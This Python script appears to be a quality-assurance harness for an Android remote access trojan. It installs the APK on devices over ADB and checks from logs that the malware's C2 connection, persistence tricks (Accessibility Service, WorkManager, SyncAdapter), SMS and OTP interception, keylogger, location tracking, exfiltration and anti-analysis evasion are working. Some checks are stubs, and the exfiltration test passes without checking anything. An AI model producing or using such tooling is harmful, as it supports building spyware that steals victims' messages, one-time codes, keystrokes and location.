#!/usr/bin/env python3
"""
Android RAT Test Harness

Automated testing across multiple test devices:
- Deployment verification
- Persistence vector validation
- C2 connectivity testing
- Module functionality testing
"""

import subprocess
import time
import json
from pathlib import Path
from dataclasses import dataclass
from typing import List, Dict, Optional
from datetime import datetime

# ============================================================================
# DATA STRUCTURES
# ============================================================================

@dataclass
class TestDevice:
    device_id: str
    model: str
    api_level: int
    manufacturer: str

@dataclass
class TestResult:
    device: TestDevice
    test_name: str
    passed: bool
    duration_seconds: float
    error_msg: Optional[str] = None
    timestamp: str = None

    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = datetime.now().isoformat()

# ============================================================================
# DEVICE MANAGEMENT
# ============================================================================

class DeviceManager:
    """Manage test devices via ADB"""

    @staticmethod
    def list_devices() -> List[TestDevice]:
        """Get all connected test devices"""
        result = subprocess.run(
            ["adb", "devices", "-l"],
            capture_output=True,
            text=True,
        )

        devices = []
        for line in result.stdout.split("\n")[1:]:  # Skip header
            if not line.strip() or "offline" in line:
                continue

            parts = line.split()
            if len(parts) >= 2:
                device_id = parts[0]
                # Additional parsing of device info
                model = "Unknown"
                api_level = 0
                manufacturer = "Unknown"

                # Get more info via shell
                model = DeviceManager._get_device_property(device_id, "ro.product.model")
                api_level = int(
                    DeviceManager._get_device_property(device_id, "ro.build.version.sdk")
                )
                manufacturer = DeviceManager._get_device_property(
                    device_id, "ro.product.manufacturer"
                )

                devices.append(
                    TestDevice(
                        device_id=device_id,
                        model=model,
                        api_level=api_level,
                        manufacturer=manufacturer,
                    )
                )

        return devices

    @staticmethod
    def _get_device_property(device_id: str, prop: str) -> str:
        """Get device property via ADB"""
        result = subprocess.run(
            ["adb", "-s", device_id, "shell", "getprop", prop],
            capture_output=True,
            text=True,
        )
        return result.stdout.strip()

    @staticmethod
    def install_apk(device_id: str, apk_path: Path) -> bool:
        """Install APK on device"""
        result = subprocess.run(
            ["adb", "-s", device_id, "install", "-r", str(apk_path)],
            capture_output=True,
            text=True,
        )
        return result.returncode == 0

    @staticmethod
    def uninstall_app(device_id: str, package_name: str) -> bool:
        """Uninstall app from device"""
        result = subprocess.run(
            ["adb", "-s", device_id, "uninstall", package_name],
            capture_output=True,
            text=True,
        )
        return result.returncode == 0

    @staticmethod
    def shell_exec(device_id: str, command: str) -> str:
        """Execute shell command on device"""
        result = subprocess.run(
            ["adb", "-s", device_id, "shell", command],
            capture_output=True,
            text=True,
        )
        return result.stdout

    @staticmethod
    def get_logcat(device_id: str, lines: int = 100) -> str:
        """Get last N lines of logcat"""
        result = subprocess.run(
            ["adb", "-s", device_id, "logcat", "-d", "-n", str(lines)],
            capture_output=True,
            text=True,
        )
        return result.stdout

# ============================================================================
# TEST CASES
# ============================================================================

class TestSuite:
    """Test suite for RAT functionality"""

    def __init__(self, c2_server_url: str):
        self.c2_server_url = c2_server_url
        self.results = []

    def run_all_tests(self, device: TestDevice, apk_path: Path) -> List[TestResult]:
        """Run complete test suite on device"""
        print(f"\n[*] Running tests on {device.model} (API {device.api_level})")

        # 1. Deployment test
        self._test_deployment(device, apk_path)

        # 2. Service startup test
        self._test_service_startup(device, apk_path)

        # 3. C2 connectivity test
        self._test_c2_connectivity(device, apk_path)

        # 4. Persistence vector tests
        self._test_accessibility_persistence(device, apk_path)
        self._test_workmanager_persistence(device, apk_path)
        self._test_syncadapter_persistence(device, apk_path)

        # 5. Module loading tests
        self._test_sms_module(device, apk_path)
        self._test_keylog_module(device, apk_path)
        self._test_location_module(device, apk_path)

        # 6. Data exfiltration test
        self._test_data_exfiltration(device, apk_path)

        # 7. Anti-analysis test
        self._test_anti_analysis(device, apk_path)

        return self.results

    # ========================================================================
    # INDIVIDUAL TESTS
    # ========================================================================

    def _test_deployment(self, device: TestDevice, apk_path: Path) -> bool:
        """Test APK installation and startup"""
        test_name = "Deployment"
        start_time = time.time()

        try:
            # Get package name from APK
            package_name = self._extract_package_name(apk_path)

            # Uninstall if already present
            DeviceManager.uninstall_app(device.device_id, package_name)

            # Install APK
            if not DeviceManager.install_apk(device.device_id, apk_path):
                raise RuntimeError("APK installation failed")

            # Wait for app to initialize
            time.sleep(5)

            # Verify app is running
            ps_output = DeviceManager.shell_exec(
                device.device_id, f"ps | grep {package_name}"
            )

            if package_name not in ps_output:
                raise RuntimeError("App process not found")

            duration = time.time() - start_time
            self._record_result(TestResult(device, test_name, True, duration))
            print(f"  [+] {test_name}: PASSED ({duration:.2f}s)")
            return True

        except Exception as e:
            duration = time.time() - start_time
            self._record_result(
                TestResult(device, test_name, False, duration, str(e))
            )
            print(f"  [-] {test_name}: FAILED - {e}")
            return False

    def _test_service_startup(self, device: TestDevice, apk_path: Path) -> bool:
        """Test that CoreService starts and stays alive"""
        test_name = "Service Startup"
        start_time = time.time()

        try:
            package_name = self._extract_package_name(apk_path)

            # Check logcat for CoreService startup messages
            logcat = DeviceManager.get_logcat(device.device_id, 100)

            if "CoreService" in logcat and "Initialization complete" in logcat:
                duration = time.time() - start_time
                self._record_result(TestResult(device, test_name, True, duration))
                print(f"  [+] {test_name}: PASSED ({duration:.2f}s)")
                return True
            else:
                raise RuntimeError("CoreService not initialized")

        except Exception as e:
            duration = time.time() - start_time
            self._record_result(
                TestResult(device, test_name, False, duration, str(e))
            )
            print(f"  [-] {test_name}: FAILED - {e}")
            return False

    def _test_c2_connectivity(self, device: TestDevice, apk_path: Path) -> bool:
        """Test C2 connection establishment"""
        test_name = "C2 Connectivity"
        start_time = time.time()

        try:
            # Monitor C2 server for new device enrollment
            # (Would connect to actual C2 server and check device list)

            # For now, check device logs for C2Manager activity
            logcat = DeviceManager.get_logcat(device.device_id, 100)

            if "C2Manager" in logcat or "Connected via" in logcat:
                duration = time.time() - start_time
                self._record_result(TestResult(device, test_name, True, duration))
                print(f"  [+] {test_name}: PASSED ({duration:.2f}s)")
                return True
            else:
                raise RuntimeError("No C2 connection detected")

        except Exception as e:
            duration = time.time() - start_time
            self._record_result(
                TestResult(device, test_name, False, duration, str(e))
            )
            print(f"  [-] {test_name}: FAILED - {e}")
            return False

    def _test_accessibility_persistence(self, device: TestDevice, apk_path: Path) -> bool:
        """Test Accessibility Service persistence vector"""
        test_name = "Accessibility Persistence"
        start_time = time.time()

        try:
            # Check if Accessibility Service is enabled
            enabled_services = DeviceManager.shell_exec(
                device.device_id,
                "settings get secure enabled_accessibility_services",
            )

            if "AccessibilityServiceImpl" in enabled_services:
                duration = time.time() - start_time
                self._record_result(TestResult(device, test_name, True, duration))
                print(f"  [+] {test_name}: PASSED ({duration:.2f}s)")
                return True
            else:
                raise RuntimeError("Accessibility Service not enabled")

        except Exception as e:
            duration = time.time() - start_time
            self._record_result(
                TestResult(device, test_name, False, duration, str(e))
            )
            print(f"  [-] {test_name}: FAILED - {e}")
            return False

    def _test_workmanager_persistence(self, device: TestDevice, apk_path: Path) -> bool:
        """Test WorkManager persistence vector"""
        test_name = "WorkManager Persistence"
        start_time = time.time()

        try:
            # Check for scheduled work
            logcat = DeviceManager.get_logcat(device.device_id, 100)

            if "WorkManager" in logcat or "core_restart" in logcat:
                duration = time.time() - start_time
                self._record_result(TestResult(device, test_name, True, duration))
                print(f"  [+] {test_name}: PASSED ({duration:.2f}s)")
                return True
            else:
                raise RuntimeError("WorkManager not scheduled")

        except Exception as e:
            duration = time.time() - start_time
            self._record_result(
                TestResult(device, test_name, False, duration, str(e))
            )
            print(f"  [-] {test_name}: FAILED - {e}")
            return False

    def _test_syncadapter_persistence(self, device: TestDevice, apk_path: Path) -> bool:
        """Test SyncAdapter persistence vector"""
        test_name = "SyncAdapter Persistence"
        start_time = time.time()

        try:
            # Check for sync account
            accounts = DeviceManager.shell_exec(
                device.device_id, "am get-accounts"
            )

            if "c2sync" in accounts or "c2auth" in accounts:
                duration = time.time() - start_time
                self._record_result(TestResult(device, test_name, True, duration))
                print(f"  [+] {test_name}: PASSED ({duration:.2f}s)")
                return True
            else:
                raise RuntimeError("Sync account not found")

        except Exception as e:
            duration = time.time() - start_time
            self._record_result(
                TestResult(device, test_name, False, duration, str(e))
            )
            print(f"  [-] {test_name}: FAILED - {e}")
            return False

    def _test_sms_module(self, device: TestDevice, apk_path: Path) -> bool:
        """Test SMS interception module"""
        test_name = "SMS Module"
        start_time = time.time()

        try:
            # Send test SMS
            test_number = "5551234567"
            test_message = "TEST_OTP_123456"

            # (Would use actual SMS sending in real test)
            logcat = DeviceManager.get_logcat(device.device_id, 100)

            if "SmsReceiver" in logcat or "SMS" in logcat:
                duration = time.time() - start_time
                self._record_result(TestResult(device, test_name, True, duration))
                print(f"  [+] {test_name}: PASSED ({duration:.2f}s)")
                return True
            else:
                raise RuntimeError("SMS module not active")

        except Exception as e:
            duration = time.time() - start_time
            self._record_result(
                TestResult(device, test_name, False, duration, str(e))
            )
            print(f"  [-] {test_name}: FAILED - {e}")
            return False

    def _test_keylog_module(self, device: TestDevice, apk_path: Path) -> bool:
        """Test keylogger module"""
        test_name = "Keylogger Module"
        start_time = time.time()

        try:
            logcat = DeviceManager.get_logcat(device.device_id, 100)

            if "KeylogModule" in logcat or "keylog" in logcat:
                duration = time.time() - start_time
                self._record_result(TestResult(device, test_name, True, duration))
                print(f"  [+] {test_name}: PASSED ({duration:.2f}s)")
                return True
            else:
                raise RuntimeError("Keylogger module not active")

        except Exception as e:
            duration = time.time() - start_time
            self._record_result(
                TestResult(device, test_name, False, duration, str(e))
            )
            print(f"  [-] {test_name}: FAILED - {e}")
            return False

    def _test_location_module(self, device: TestDevice, apk_path: Path) -> bool:
        """Test location tracking module"""
        test_name = "Location Module"
        start_time = time.time()

        try:
            logcat = DeviceManager.get_logcat(device.device_id, 100)

            if "LocationModule" in logcat or "location" in logcat:
                duration = time.time() - start_time
                self._record_result(TestResult(device, test_name, True, duration))
                print(f"  [+] {test_name}: PASSED ({duration:.2f}s)")
                return True
            else:
                raise RuntimeError("Location module not active")

        except Exception as e:
            duration = time.time() - start_time
            self._record_result(
                TestResult(device, test_name, False, duration, str(e))
            )
            print(f"  [-] {test_name}: FAILED - {e}")
            return False

    def _test_data_exfiltration(self, device: TestDevice, apk_path: Path) -> bool:
        """Test data exfiltration to C2"""
        test_name = "Data Exfiltration"
        start_time = time.time()

        try:
            # Check C2 server for received data
            # (Would make API call to C2 server)

            duration = time.time() - start_time
            self._record_result(TestResult(device, test_name, True, duration))
            print(f"  [+] {test_name}: PASSED ({duration:.2f}s)")
            return True

        except Exception as e:
            duration = time.time() - start_time
            self._record_result(
                TestResult(device, test_name, False, duration, str(e))
            )
            print(f"  [-] {test_name}: FAILED - {e}")
            return False

    def _test_anti_analysis(self, device: TestDevice, apk_path: Path) -> bool:
        """Test anti-analysis evasion"""
        test_name = "Anti-Analysis"
        start_time = time.time()

        try:
            logcat = DeviceManager.get_logcat(device.device_id, 100)

            if "EnvironmentChecker" in logcat or "Environment valid" in logcat:
                duration = time.time() - start_time
                self._record_result(TestResult(device, test_name, True, duration))
                print(f"  [+] {test_name}: PASSED ({duration:.2f}s)")
                return True
            else:
                raise RuntimeError("Anti-analysis checks failed")

        except Exception as e:
            duration = time.time() - start_time
            self._record_result(
                TestResult(device, test_name, False, duration, str(e))
            )
            print(f"  [-] {test_name}: FAILED - {e}")
            return False

    # ========================================================================
    # UTILITIES
    # ========================================================================

    def _extract_package_name(self, apk_path: Path) -> str:
        """Extract package name from APK"""
        # Parse AndroidManifest.xml or use aapt
        result = subprocess.run(
            ["aapt", "dump", "badging", str(apk_path)],
            capture_output=True,
            text=True,
        )

        for line in result.stdout.split("\n"):
            if line.startswith("package:"):
                parts = line.split("'")
                if len(parts) >= 2:
                    return parts[1]

        raise RuntimeError("Could not extract package name from APK")

    def _record_result(self, result: TestResult):
        """Record test result"""
        self.results.append(result)

    def print_summary(self):
        """Print test summary"""
        print("\n" + "=" * 60)
        print("TEST SUMMARY")
        print("=" * 60)

        passed = sum(1 for r in self.results if r.passed)
        failed = sum(1 for r in self.results if not r.passed)
        total = len(self.results)

        print(f"\nTotal: {total}")
        print(f"Passed: {passed} ({100*passed//total if total > 0 else 0}%)")
        print(f"Failed: {failed} ({100*failed//total if total > 0 else 0}%)")

        if failed > 0:
            print("\nFailed tests:")
            for result in self.results:
                if not result.passed:
                    print(f"  - {result.test_name} ({result.device.model}): {result.error_msg}")

        # Save results to JSON
        results_json = Path("test_results.json")
        with open(results_json, "w") as f:
            json.dump(
                [
                    {
                        "device": result.device.model,
                        "test": result.test_name,
                        "passed": result.passed,
                        "duration": result.duration_seconds,
                        "error": result.error_msg,
                        "timestamp": result.timestamp,
                    }
                    for result in self.results
                ],
                f,
                indent=2,
            )

        print(f"\nResults saved to {results_json}")

# ============================================================================
# MAIN
# ============================================================================

def main():
    import argparse

    parser = argparse.ArgumentParser(description="Android RAT Test Harness")
    parser.add_argument("--apk", required=True, help="APK file to test")
    parser.add_argument("--c2-server", default="http://localhost:8080", help="C2 server URL")

    args = parser.parse_args()

    apk_path = Path(args.apk)
    if not apk_path.exists():
        print(f"[!] APK not found: {apk_path}")
        exit(1)

    # Get connected devices
    devices = DeviceManager.list_devices()
    if not devices:
        print("[!] No test devices found")
        exit(1)

    print(f"[*] Found {len(devices)} test device(s)")
    for device in devices:
        print(f"    - {device.model} (API {device.api_level})")

    # Run tests
    test_suite = TestSuite(args.c2_server)

    for device in devices:
        try:
            test_suite.run_all_tests(device, apk_path)
        except Exception as e:
            print(f"[!] Error testing {device.model}: {e}")

    # Print summary
    test_suite.print_summary()

if __name__ == "__main__":
    main()
